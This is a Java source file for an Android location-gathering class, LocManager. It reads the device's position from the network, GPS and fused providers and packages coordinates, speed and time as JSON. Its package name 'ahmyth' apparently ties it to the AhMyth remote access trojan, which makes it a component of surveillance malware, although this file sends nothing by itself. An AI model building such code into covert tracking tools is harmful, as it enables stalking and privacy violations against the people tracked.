package ahmyth.mine.king.ahmyth;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Looper;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import static android.content.Context.LOCATION_SERVICE;

public class LocManager implements LocationListener {

    private static final String TAG = "LocManager";
    
    private final Context mContext;
    boolean isGPSEnabled = false;
    boolean isNetworkEnabled = false;
    boolean canGetLocation = false;
    
    Location location;
    double latitude = 0;
    double longitude = 0;
    float accuracy = 0;
    double altitude = 0;
    float speed = 0;
    float bearing = 0;
    String provider = "";
    long time = 0;
    
    private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 5; // 5 meters
    private static final long MIN_TIME_BW_UPDATES = 1000 * 30; // 30 seconds
    
    protected LocationManager locationManager;

    public LocManager() {
        this.mContext = null;
    }

    public LocManager(Context context) {
        this.mContext = context;
        getLocation();
    }

    private boolean hasLocationPermission() {
        if (mContext == null) return false;
        
        boolean fineLocation = ContextCompat.checkSelfPermission(mContext, 
            Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
        boolean coarseLocation = ContextCompat.checkSelfPermission(mContext, 
            Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;
        
        Log.d(TAG, "Fine location permission: " + fineLocation);
        Log.d(TAG, "Coarse location permission: " + coarseLocation);
        
        return fineLocation || coarseLocation;
    }

    public Location getLocation() {
        Log.d(TAG, "getLocation called");
        
        if (mContext == null) {
            Log.e(TAG, "Context is null");
            return null;
        }
        
        if (!hasLocationPermission()) {
            Log.e(TAG, "Location permission not granted");
            return null;
        }
        
        try {
            locationManager = (LocationManager) mContext.getSystemService(LOCATION_SERVICE);
            
            if (locationManager == null) {
                Log.e(TAG, "LocationManager is null");
                return null;
            }
            
            // Check GPS status
            isGPSEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
            Log.d(TAG, "GPS enabled: " + isGPSEnabled);
            
            // Check Network status
            isNetworkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
            Log.d(TAG, "Network enabled: " + isNetworkEnabled);
            
            // Also check for fused provider on newer devices
            boolean isFusedEnabled = false;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                try {
                    isFusedEnabled = locationManager.isProviderEnabled(LocationManager.FUSED_PROVIDER);
                    Log.d(TAG, "Fused provider enabled: " + isFusedEnabled);
                } catch (Exception e) {
                    Log.d(TAG, "Fused provider not available");
                }
            }

            if (isGPSEnabled || isNetworkEnabled || isFusedEnabled) {
                this.canGetLocation = true;

                // Try Network Provider first (faster)
                if (isNetworkEnabled) {
                    Log.d(TAG, "Requesting location from Network provider");
                    try {
                        locationManager.requestLocationUpdates(
                            LocationManager.NETWORK_PROVIDER, 
                            MIN_TIME_BW_UPDATES, 
                            MIN_DISTANCE_CHANGE_FOR_UPDATES, 
                            this,
                            Looper.getMainLooper()
                        );
                        
                        location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                        if (location != null) {
                            updateLocationData(location);
                            Log.d(TAG, "Network location: " + latitude + ", " + longitude);
                        }
                    } catch (SecurityException e) {
                        Log.e(TAG, "Security exception for network provider", e);
                    }
                }

                // Try GPS Provider (more accurate)
                if (isGPSEnabled && location == null) {
                    Log.d(TAG, "Requesting location from GPS provider");
                    try {
                        locationManager.requestLocationUpdates(
                            LocationManager.GPS_PROVIDER, 
                            MIN_TIME_BW_UPDATES, 
                            MIN_DISTANCE_CHANGE_FOR_UPDATES, 
                            this,
                            Looper.getMainLooper()
                        );
                        
                        location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                        if (location != null) {
                            updateLocationData(location);
                            Log.d(TAG, "GPS location: " + latitude + ", " + longitude);
                        }
                    } catch (SecurityException e) {
                        Log.e(TAG, "Security exception for GPS provider", e);
                    }
                }
                
                // Try Fused provider on newer devices
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && isFusedEnabled && location == null) {
                    Log.d(TAG, "Requesting location from Fused provider");
                    try {
                        location = locationManager.getLastKnownLocation(LocationManager.FUSED_PROVIDER);
                        if (location != null) {
                            updateLocationData(location);
                            Log.d(TAG, "Fused location: " + latitude + ", " + longitude);
                        }
                    } catch (SecurityException e) {
                        Log.e(TAG, "Security exception for fused provider", e);
                    }
                }
            } else {
                Log.w(TAG, "No location provider enabled");
            }

        } catch (Exception e) {
            Log.e(TAG, "Error getting location", e);
        }

        stopUsingGPS();
        return location;
    }
    
    private void updateLocationData(Location loc) {
        if (loc != null) {
            latitude = loc.getLatitude();
            longitude = loc.getLongitude();
            accuracy = loc.getAccuracy();
            altitude = loc.getAltitude();
            speed = loc.getSpeed();
            bearing = loc.getBearing();
            provider = loc.getProvider();
            time = loc.getTime();
        }
    }

    public void stopUsingGPS() {
        if (locationManager != null) {
            try {
                locationManager.removeUpdates(LocManager.this);
                Log.d(TAG, "Location updates stopped");
            } catch (SecurityException e) {
                Log.e(TAG, "Error stopping location updates", e);
            }
        }
    }

    public double getLatitude() {
        if (location != null) {
            latitude = location.getLatitude();
        }
        return latitude;
    }

    public double getLongitude() {
        if (location != null) {
            longitude = location.getLongitude();
        }
        return longitude;
    }
    
    public float getAccuracy() {
        if (location != null) {
            accuracy = location.getAccuracy();
        }
        return accuracy;
    }
    
    public double getAltitude() {
        if (location != null) {
            altitude = location.getAltitude();
        }
        return altitude;
    }
    
    public float getSpeed() {
        if (location != null) {
            speed = location.getSpeed();
        }
        return speed;
    }
    
    public String getProvider() {
        if (location != null) {
            provider = location.getProvider();
        }
        return provider;
    }
    
    public long getTime() {
        if (location != null) {
            time = location.getTime();
        }
        return time;
    }

    public boolean canGetLocation() {
        return this.canGetLocation;
    }
    
    public JSONObject getLocationJson() {
        JSONObject locationJson = new JSONObject();
        try {
            locationJson.put("enable", canGetLocation);
            locationJson.put("lat", latitude);
            locationJson.put("lng", longitude);
            locationJson.put("accuracy", accuracy);
            locationJson.put("altitude", altitude);
            locationJson.put("speed", speed);
            locationJson.put("bearing", bearing);
            locationJson.put("provider", provider);
            locationJson.put("time", time);
            locationJson.put("gpsEnabled", isGPSEnabled);
            locationJson.put("networkEnabled", isNetworkEnabled);
        } catch (JSONException e) {
            Log.e(TAG, "Error creating location JSON", e);
        }
        return locationJson;
    }

    @Override
    public void onLocationChanged(Location location) {
        Log.d(TAG, "Location changed: " + location.getLatitude() + ", " + location.getLongitude());
        updateLocationData(location);
    }

    @Override
    public void onProviderDisabled(String provider) {
        Log.d(TAG, "Provider disabled: " + provider);
    }

    @Override
    public void onProviderEnabled(String provider) {
        Log.d(TAG, "Provider enabled: " + provider);
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {
        Log.d(TAG, "Provider status changed: " + provider + " status: " + status);
    }
}
